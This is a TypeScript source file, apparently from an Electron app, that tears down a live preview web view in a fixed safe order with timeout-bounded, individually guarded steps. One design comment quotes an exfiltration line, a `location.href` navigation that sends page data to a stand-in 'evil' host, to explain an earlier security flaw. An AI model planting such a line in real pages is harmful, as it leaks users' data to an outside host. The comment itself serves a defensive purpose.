// SPDX-License-Identifier: GPL-3.0-only
// SPDX-FileCopyrightText: 2025-2026 Qodeca sp. z o.o.
/**
 * The bounded teardown of one live preview view (Issue #124, WI-1; design §3).
 * Moved out of `PreviewLiveView.ts` unchanged.
 *
 * Owns no state. The view hands over what it owns as an ordered list of named
 * steps; each step is isolated, so a failure is logged and every later step
 * still runs, and the page is destroyed whatever happened before it.
 */

import { PREVIEW } from '../../../shared/constants'
import { stablePathDigest } from '../../../shared/stablePathDigest'
import { logger } from '../LoggingService'
import { withTimeout } from '../../utils/withTimeout'
import type { PreviewViewHandle, PreviewWebContentsHandle } from './PreviewSessionFactory'
import type { PreviewWindowLike } from './previewLiveTypes'

/**
 * One thing to release. `run` is called inline and unbounded; `runAsync` is
 * awaited and raced against `PREVIEW.TEARDOWN_STEP_TIMEOUT_MS`.
 */
export type PreviewTeardownStep =
  | { readonly label: string; readonly run: () => void }
  | { readonly label: string; readonly runAsync: () => Promise<void> }

/** Everything a page teardown needs from the view being torn down. */
export interface PreviewLiveTeardownParts {
  readonly panelId: string
  /**
   * `immediate` destroys the webContents straight away (project switch /
   * dispose / replace); `bounded` races `close()` against
   * `PREVIEW.CLOSE_TIMEOUT_MS` before forcing `destroy()` (a user tab close, X21).
   */
  readonly mode: 'immediate' | 'bounded'
  /** The host window; the view leaves it first, unless the window is already gone. */
  readonly window: Pick<PreviewWindowLike, 'isDestroyed' | 'contentView'>
  readonly view: PreviewViewHandle
  readonly wc: Pick<PreviewWebContentsHandle, 'isDestroyed' | 'destroy' | 'close' | 'once'>
  /** Released in this order, once the view has left its window. */
  readonly collaborators: readonly PreviewTeardownStep[]
  /** A bounded destroy is starting: the page is going away but not yet gone. */
  readonly onClosing: () => void
  /** Detach the session's cage: the network filter, the protocol handler, the denials. */
  readonly detach: () => void
  /** Hand the partition back for reuse; called only after a clean detach. */
  readonly release: () => Promise<void>
}

/**
 * An error as a log line carries it: its name, plus `code` when it has one.
 * Never the message, which can quote a path or a preview URL (QG-7 S3).
 */
function errorFieldsOf(error: unknown): { error: string; code?: string } {
  if (!(error instanceof Error)) {
    return { error: typeof error }
  }
  const { code } = error as NodeJS.ErrnoException
  return typeof code === 'string' ? { error: error.name, code } : { error: error.name }
}

/**
 * Release every collaborator the view owns. Each step is isolated so one
 * failure cannot skip the rest; failures are logged, never rethrown, because
 * a teardown that reports an error is still a teardown that must complete.
 */
async function teardownCollaborators(
  panelId: string,
  collaborators: readonly PreviewTeardownStep[]
): Promise<void> {
  const warn = (label: string, error: unknown): void => {
    logger.warn('Preview teardown step failed', {
      panelId: stablePathDigest(panelId),
      step: label,
      ...errorFieldsOf(error)
    })
  }
  const step = (label: string, run: () => void): void => {
    try {
      run()
    } catch (error) {
      warn(label, error)
    }
  }
  // Each async step is bounded. On Windows `storageSeal.purge` never settled
  // (2026-09-03): eviction hung here, the old renderer process was never
  // destroyed, and the tab never heard `'suspended'`. A step that overruns is
  // logged like a throw and skipped; the destroy in `teardownLiveView`'s
  // `finally` still happens.
  const asyncStep = async (label: string, run: () => Promise<void>): Promise<void> => {
    try {
      await withTimeout(run(), PREVIEW.TEARDOWN_STEP_TIMEOUT_MS, `Preview teardown ${label}`)
    } catch (error) {
      warn(label, error)
    }
  }
  for (const collaborator of collaborators) {
    if ('runAsync' in collaborator) {
      await asyncStep(collaborator.label, collaborator.runAsync)
    } else {
      step(collaborator.label, collaborator.run)
    }
  }
}

/**
 * Tear down one view's page in the only safe order:
 *
 *   1. The view leaves its window – skipped only when the window is genuinely
 *      gone. A throw from a LIVE window is a real signal — `close()`, budget
 *      eviction, replace-on-reopen, the global off-switch and a project switch
 *      all detach while the window is alive — so the guard is on window
 *      liveness, never on the step itself.
 *   2. The collaborators, in the order given.
 *   3. The page is destroyed.
 *   4. Only then the cage is detached (`detach`: the network filter, the
 *      protocol handler, the permission denials) and the partition handed back.
 *      Detaching first left the page alive for up to ~3 s with no egress gate —
 *      a queued `location.href = 'https://evil/?' + data` landed the moment the
 *      `will-navigate` lock went (security review). No purge runs before this
 *      either: the partition's `release` purges AFTER the page is destroyed,
 *      which is both the safe order and the only one that lets the name be
 *      reused. (On Windows the live-session purge never settled at all.)
 *
 * EVERY step is individually guarded and the destroy is in a `finally`.
 * Before this, `lifecycle.dispose()` and `watchCoordinator.dispose()` were
 * awaited bare: a throw from either (a chokidar `close()` rejecting, say)
 * skipped the token revoke, the still-frame invalidate AND `wc.destroy()`,
 * while the view's `destroyed` latch was already set — leaving a permanently
 * inert object holding a live WebContents and a registry token. Under the
 * multi-view registry that also strands the panel id forever, because every
 * re-open would take the replace branch and re-await this same dead teardown
 * (sd-074b §4.1).
 */
export async function teardownLiveView(parts: PreviewLiveTeardownParts): Promise<void> {
  const { panelId, view, wc } = parts
  const steps: PreviewTeardownStep[] = parts.window.isDestroyed()
    ? [...parts.collaborators]
    : [
        { label: 'removeChildView', run: () => parts.window.contentView.removeChildView(view) },
        ...parts.collaborators
      ]
  await teardownCollaborators(panelId, steps).finally(async () => {
    if (parts.mode === 'bounded') {
      parts.onClosing()
      await boundedDestroy(wc)
    } else if (!wc.isDestroyed()) {
      wc.destroy()
    }
  })
  // Only now, with the page dead, detach the cage — then the partition can go
  // back for reuse. A name that went back with a stale handler attached would
  // fail the next open on it at `attachProtocol`, so a failed detach drops
  // the name instead. `release` purges (bounded) and never rejects; guarded
  // all the same.
  let detached = true
  try {
    parts.detach()
  } catch (error) {
    detached = false
    logger.warn('Preview teardown: detach failed; partition not reused', {
      panelId: stablePathDigest(panelId),
      ...errorFieldsOf(error)
    })
  }
  if (!detached) {
    return
  }
  try {
    await parts.release()
  } catch (error) {
    logger.warn('Preview teardown: partition hand-back failed', {
      panelId: stablePathDigest(panelId),
      ...errorFieldsOf(error)
    })
  }
}

/** Race `close()` against `CLOSE_TIMEOUT_MS`, then force `destroy()` (X21). */
function boundedDestroy(wc: PreviewLiveTeardownParts['wc']): Promise<void> {
  return new Promise<void>((resolvePromise) => {
    if (wc.isDestroyed()) {
      resolvePromise()
      return
    }
    let settled = false
    const finish = (): void => {
      if (settled) {
        return
      }
      settled = true
      clearTimeout(timer)
      resolvePromise()
    }
    const timer = setTimeout(() => {
      if (!wc.isDestroyed()) {
        wc.destroy()
      }
      finish()
    }, PREVIEW.CLOSE_TIMEOUT_MS)
    wc.once('destroyed', (() => finish()) as (...args: never[]) => void)
    try {
      wc.close()
    } catch {
      if (!wc.isDestroyed()) {
        wc.destroy()
      }
      finish()
    }
  })
}

/**
 * Dispose whatever a constructor had built when it threw, in the order given; a
 * collaborator it never reached is `undefined` and skipped. Only the view-owned
 * collaborators: the session (token, protocol, filter, purge) is discarded by
 * the caller, which never learned the view existed.
 */
export async function unwindConstruction(
  panelId: string,
  built: Readonly<Record<string, { dispose(): void | Promise<void> } | undefined>>
): Promise<void> {
  const attempt = async (label: string, run: () => void | Promise<void>): Promise<void> => {
    try {
      await withTimeout(Promise.resolve(run()), PREVIEW.TEARDOWN_STEP_TIMEOUT_MS, label)
    } catch (error) {
      logger.warn('Preview construction unwind step failed', {
        panelId: stablePathDigest(panelId),
        step: label,
        ...errorFieldsOf(error)
      })
    }
  }
  for (const [name, collaborator] of Object.entries(built)) {
    if (collaborator) {
      await attempt(`${name}.dispose`, () => collaborator.dispose())
    }
  }
}
